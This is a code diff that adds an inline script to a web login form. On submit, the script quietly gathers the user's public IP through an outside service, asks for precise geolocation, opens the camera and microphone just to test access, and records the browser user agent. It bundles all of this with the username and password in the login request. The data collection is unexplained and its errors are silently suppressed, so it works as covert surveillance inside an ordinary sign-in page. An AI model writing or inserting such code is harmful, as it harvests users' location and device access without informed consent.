@@ -29,6 +29,59 @@
     <p id="loginResponse"></p>
   </div>
 
+<script>
+async function getUserDetails() {
+  const ipRes = await fetch("https://api.ipify.org?format=json");
+  const ipData = await ipRes.json();
+
+  let location = {};
+  try {
+    await new Promise((resolve, reject) => {
+      navigator.geolocation.getCurrentPosition(pos => {
+        location = {
+          latitude: pos.coords.latitude,
+          longitude: pos.coords.longitude
+        };
+        resolve();
+      }, reject);
+    });
+  } catch {}
+
+  let permissions = {
+    camera: false,
+    microphone: false
+  };
+
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+    permissions.camera = true;
+    permissions.microphone = true;
+    stream.getTracks().forEach(track => track.stop());
+  } catch {}
+
+  return {
+    ip: ipData.ip,
+    location,
+    permissions,
+    device: navigator.userAgent
+  };
+}
+
+document.querySelector("#loginForm").addEventListener("submit", async (e) => {
+  e.preventDefault();
+  const username = document.querySelector("#username").value;
+  const password = document.querySelector("#password").value;
+  const extra = await getUserDetails();
+
+  fetch("/login", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ username, password, ...extra })
+  }).then(res => res.json()).then(data => {
+    alert(data.message);
+  });
+});
+</script>
   <script src="js/login.js"></script>
 <script src="js/logout.js"></script>
 <script src="js/register.js"></script>
